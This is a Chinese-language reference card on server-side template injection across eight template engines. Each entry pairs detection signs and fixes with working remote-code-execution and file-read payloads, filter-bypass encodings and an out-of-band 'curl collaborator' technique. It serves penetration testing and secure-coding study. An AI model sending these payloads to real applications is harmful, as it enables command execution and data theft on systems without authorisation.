# 模板注入技术 (Server-Side Template Injection - SSTI)

> 来源: PortSwigger Academy / HackTricks / PayloadsAllTheThings
> 条目数: 10 | 分类: 模板注入 (SSTI)

---

### [KB-SSTI-01] Jinja2 / Python SSTI
- **信号**: 模板表达式被直接渲染（如 `{{7*7}}` 返回 `49`）；Flask/Jinja2 应用将用户输入拼接进 `render_template_string()`；URL 参数在错误页面中以模板变量形式回显
- **原理**: Jinja2 中通过 `{{}}` 访问 Python 对象链：从基础类型出发，经 `__class__` → `__mro__` → `__subclasses__()` 遍历获取 `subprocess.Popen` 或 `os.system` 的引用，最终执行系统命令
- **最小PoC**: `{{7*7}}` 确认注入 → `{{''.__class__.__mro__[1].__subclasses__()}}` → 定位 `<class 'subprocess.Popen'>` → `{{''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate()}}`
- **绕过与变体**: `{{config.items()}}` 探测 Flask 配置；`lipsum|attr('\u005f\u005fglobals\u005f\u005f')` 使用 Unicode 编码绕过过滤；`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}` 访问 Flask 全局对象；链式 `attr()` 绕过 `.` 过滤
- **修复**: 禁止 `render_template_string()` 拼接用户输入；使用沙箱化模板环境（Jinja2 SandboxedEnvironment）；将模板语法字符（`{{` `}}` `{%` `%}`）转义或过滤
- **参考**: CWE-94 / PortSwigger: SSTI / PayloadsAllTheThings: SSTI

---

### [KB-SSTI-02] Twig / PHP SSTI
- **信号**: PHP 应用使用 Twig 模板引擎且 `{{7*7}}` 返回 `49`；Symfony 框架中用户输入影响 Twig 模板内容
- **原理**: Twig 默认无危险的函数调用能力，但通过 `_self` → `setLoader()` → 加载自定义模板路径可实现文件读取；或利用 `registerUndefinedFilterCallback` 配合 `call_user_func` 实现系统命令执行
- **最小PoC**: `{{7*7}}` → `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}` (Twig 1.x)；`{{['id']|filter('system')}}` (特定版本)
- **绕过与变体**: Twig 2/3 去除了 `_self` 访问限制但核心沙箱更强；利用开发自定义的 Twig 扩展注入；通过 `{{dump(app)}}` 探测 Symfony 容器内容
- **修复**: 禁止拼接用户输入到 Twig 模板；定期升级 Twig 至最新版本；审视自定义 Twig 扩展的暴露面
- **参考**: CWE-94 / PortSwigger: SSTI / HackTricks: SSTI Twig

---

### [KB-SSTI-03] FreeMarker / Java SSTI
- **信号**: Java 应用使用 FreeMarker 模板，注入 `${7*7}` 返回 `49`；Spring Boot 集成 FreeMarker 且模板内容用户可控
- **原理**: FreeMarker 通过 `${}` 语法执行表达式，`new()` 可实例化任意 Java 类，结合 `Runtime.getRuntime().exec()` 或 `ProcessBuilder` 实现命令执行；利用 `freemarker.template.utility.Execute` 类直接执行
- **最小PoC**: `${7*7}` → `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}` → 命令输出
- **绕过与变体**: `${'freemarker.template.utility.ObjectConstructor'?new()('java.lang.ProcessBuilder','id'.split(' ')).start()}`；利用 `freemarker.core.Environment` 读取变量环境
- **修复**: 禁止用户输入影响 FreeMarker 模板内容；配置 `Configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)` 限制 `new()` 能力
- **参考**: CWE-94 / FreeMarker Security / PortSwigger: SSTI

---

### [KB-SSTI-04] Velocity SSTI
- **信号**: Java Web 应用使用 Apache Velocity 模板；`#set($x=7*7) $x` 返回 `49`
- **原理**: Velocity 的 `#evaluate()` 指令执行动态模板字符串，配合 Velocity 上下文中的对象或 Java 反射（`Class.forName()`）实现任意类加载与命令执行
- **最小PoC**: `#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($ex=$rt.getRuntime().exec('id')) $ex` (Velocity 1.7+)
- **绕过与变体**: 利用 VelocityTools 的工具类；`#set($str=$class.inspect('java.lang.String'))` 探测类路径；Jira/Confluence 历史 SSTI RCE
- **修复**: 禁止用户输入作为 Velocity 模板执行；移除 `#evaluate()` 指令支持；沙箱化 Velocity 上下文限制可用类
- **参考**: CWE-94 / HackTricks: Velocity SSTI / Atlassian Security Advisories

---

### [KB-SSTI-05] Smarty / PHP SSTI
- **信号**: PHP 应用使用 Smarty 模板引擎；`{7*7}` 返回 `49`；CMS/电商系统使用 Smarty
- **原理**: Smarty 3 的 `{php}` 标签（需开启 `$smarty->allow_php_tag=true`）或 `{system('id')}` 直接执行 PHP 代码；Smarty 的 `{fetch}` 和 `{include}` 可读取/包含服务器文件
- **最小PoC**: `{php}echo shell_exec('id');{/php}`；`{system('ls -la')}`；`{fetch file='/etc/passwd'}`
- **绕过与变体**: `{include file='php://filter/convert.base64-encode/resource=index.php'}` 文件读取；`{literal}{/literal}` 绕过 Smarty 定界符过滤
- **修复**: 禁止用户控制模板内容；禁用 `{php}` 标签（`$smarty->allow_php_tag=false`）；禁用 `{system}` 等危险函数注册
- **参考**: CWE-94 / Smarty Security / HackTricks: Smarty SSTI

---

### [KB-SSTI-06] ERB / Ruby SSTI
- **信号**: Ruby/Rails 应用使用 ERB 模板；`<%= 7*7 %>` 返回 `49`；用户可控模板注入到 `ERB.new()`
- **原理**: ERB (Embedded Ruby) 的 `<%= %>` 和 `<% %>` 标签执行任意 Ruby 代码；通过 `Kernel.system()` / `` `command` ``（反引号）/ `IO.popen()` 实现命令执行
- **最小PoC**: `<%= 7*7 %>` → `<%= \`id\` %>` → 执行 `id` 命令；`<%= File.read('/etc/passwd') %>` 读取文件
- **绕过与变体**: `<% require 'open3' %><%= Open3.capture2('id') %>`；利用 Rails helper 方法链；Slim/Haml 模板引擎的等价注入
- **修复**: 禁止 `ERB.new(user_input)` 动态编译模板；预编译所有模板；模板中使用安全的 helper 方法替代裸 Ruby 代码
- **参考**: CWE-94 / Ruby ERB Security / PortSwigger: SSTI

---

### [KB-SSTI-07] Handlebars / Node.js SSTI
- **信号**: Node.js 应用使用 Handlebars 模板；`{{7*7}}` 不会计算（Handlebars 无反引逻辑），但 `{{constructor.constructor('return 7*7')()}}` 返回 `49`
- **原理**: Handlebars 本身较安全，但通过 `{{this}}` 访问当前上下文 → `this.constructor.constructor` 获取 `Function` 构造器 → 传入字符串代码实现执行
- **最小PoC**: `{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}} {{#with string.split as |codeobj|}} {{this.pop}} {{this.push "return require('child_process').execSync('id').toString();"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 conslist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}`
- **绕过与变体**: 通过 Handlebars helpers 自定义注入；`{{lookup ...}}` 路径逃逸；`{{#with ...}}` 上下文切换
- **修复**: 禁止用户输入作为 Handlebars 模板；升级 Handlebars 至最新版；禁用 `compile()` 模式
- **参考**: CWE-94 / Handlebars Security / HackTricks: SSTI

---

### [KB-SSTI-08] Pug / Jade SSTI
- **信号**: Node.js 应用使用 Pug/Jade 模板引擎；注入 `#{7*7}` → 模板编译后输出 `49`
- **原理**: Pug 的 `#{}` 字符串插值会执行任意 JavaScript 表达式，通过全局对象 `global` 或 `process` 访问 `require` 并执行 `child_process.execSync()`
- **最小PoC**: `#{7*7}` → `#{function(){return global.process.mainModule.require('child_process').execSync('id').toString()}()}` → 命令执行
- **绕过与变体**: `#{this.constructor.constructor('return this.process')().mainModule.require(...)}`；利用 Pug 的 `-` 代码行和 `=` 输出行注入
- **修复**: 禁止用户输入作为 Pug 模板编译；设置 Pug compile 选项的沙箱；使用 `pug.compile()` 的预编译模板
- **参考**: CWE-94 / Pug Security / PayloadsAllTheThings: SSTI

---

### [KB-SSTI-09] SSTI 沙箱逃逸通用技巧
- **信号**: 目标模板引擎有沙箱限制（无直接 `os.system` / `require` / `exec`），但 `7*7` 仍返回 `49`
- **原理**: 所有模板沙箱逃逸的核心路径是：获取语言基础对象 → 遍历继承链 → 获取下层不安全函数引用。Python 的 `__mro__`/`__subclasses__`，JavaScript 的 `constructor.constructor`，Java 的 `Class.forName`/反射
- **最小PoC**: Python: `{{''.__class__.__bases__[0].__subclasses__()}}`；Node: `{{this.constructor.constructor('return this')()}}`；Java: `<#assign c='class'.forName('java.lang.Runtime')>`
- **绕过与变体**: 利用 `|attr()` 绕过属性访问过滤；Unicode/十六进制编码绕过关键字黑名单；字符串拼接绕过函数名过滤；`request` / `session` / `config` 对象作为跳板
- **修复**: 多层防御：不使用用户输入拼接模板 + 模板沙箱 + 进程隔离（容器/VM）+ 最小权限运行模板引擎
- **参考**: CWE-94 / Generic SSTI escape patterns / PortSwigger

---

### [KB-SSTI-10] SSTI 通用检测与 RCE 方法
- **信号**: 应用将用户可控输入渲染为模板输出（如邮件模板、报表、自定义页面）；输入 `${{<%[%'"}}` 后页面报错或语法异常变更
- **原理**: 使用多模板引擎的数学表达式作为通用 probe：`${7*7}` (FreeMarker/Velocity)、`{{7*7}}` (Jinja2/Twig/Handlebars)、`<%= 7*7 %>` (ERB/EJS)、`#{7*7}` (Pug)。识别引擎类型后应用该引擎的特定 RCE payload
- **最小PoC**: 发送 `${{7*7}}` `{{7*7}}` `<%= 7*7 %>` `#{7*7}` `{7*7}` 五个探针 → 观察哪个返回 `49` → 确定引擎类型 → 使用引擎对应 payload
- **绕过与变体**: 盲 SSTI（无回显）→ 使用 OOB payload（`curl collaborator` / `sleep` 延时）；错误消息中的引擎指纹识别（如 `jinja2.exceptions`、`freemarker.core`）
- **修复**: 根本解法：永不将用户输入作为模板引擎的输入。如需用户自定义模板，提供受限的 DSL（领域特定语言）而非通用模板
- **参考**: CWE-94 / PortSwigger: SSTI Decision Tree / PayloadsAllTheThings: SSTI Detection
